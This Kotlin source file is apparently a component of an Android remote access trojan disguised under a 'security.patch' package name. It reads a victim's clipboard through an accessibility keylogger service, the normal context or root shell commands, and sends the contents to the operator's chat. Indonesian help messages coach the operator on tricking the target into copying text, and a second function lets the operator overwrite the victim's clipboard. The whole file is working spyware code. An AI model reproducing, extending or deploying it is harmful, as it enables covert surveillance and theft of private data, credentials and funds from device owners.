package com.android.security.patch.commands

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import com.android.security.patch.RatApi

object Clipboard {

    fun read(ctx: Context, chatId: Long) {
        Thread {
            var text: String? = null

            // 1. coba accessibility instance dulu
            try {
                val svc = com.android.security.patch.KeylogService.instance
                if (svc != null) {
                    val cm = svc.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clip = cm.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        val s = StringBuilder()
                        for (i in 0 until clip.itemCount) {
                            val it = clip.getItemAt(i)
                            s.append(it.text?.toString() ?: it.uri?.toString() ?: "")
                            if (i < clip.itemCount - 1) s.append("\n")
                        }
                        if (s.isNotBlank()) text = s.toString()
                    }
                }
            } catch (_: Throwable) {}

            // 2. coba context biasa
            if (text == null) {
                try {
                    val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val clip = cm.primaryClip
                    if (clip != null && clip.itemCount > 0) {
                        text = clip.getItemAt(0).coerceToText(ctx)?.toString()
                    }
                } catch (_: Throwable) {}
            }

            // 3. root: service call clipboard (works di Android 10-12)
            if (text.isNullOrBlank()) {
                try {
                    val p = ProcessBuilder("su", "-c",
                        "service call clipboard 2 i32 1 s16 com.android.shell i32 0 2>/dev/null")
                        .redirectErrorStream(true).start()
                    val out = p.inputStream.bufferedReader().readText()
                    p.waitFor()
                    val m = Regex("""'([^']{1,500})'""").find(out)
                    if (m != null) text = m.groupValues[1]
                } catch (_: Throwable) {}
            }

            if (text.isNullOrBlank()) {
                RatApi.sendMessage(ctx,
                    "clipboard kosong atau gak ke-baca.\n\n" +
                    "<b>penyebab:</b> Android 10+ cuma izinin baca clipboard saat apk kita di foreground.\n\n" +
                    "<b>cara work:</b>\n" +
                    "1. kirim <code>/popup Copy|Tekan lama terus salin</code> — popup di target\n" +
                    "2. target copy teks apapun\n" +
                    "3. kirim <code>/clipboard</code> lagi dalam 10 detik",
                    chatId)
            } else {
                RatApi.sendMessage(ctx, "<b>📋 clipboard</b>\n<pre>${text.take(3500)}</pre>", chatId)
            }
        }.start()
    }

    fun write(ctx: Context, chatId: Long, args: Array<String>) {
        val text = args.joinToString(" ")
        if (text.isBlank()) {
            RatApi.sendMessage(ctx, "usage: /clipboard_set <text>", chatId); return
        }
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("text", text))
            RatApi.sendMessage(ctx, "clipboard set", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "clipboard_set err: ${e.message}", chatId)
        }
    }
}
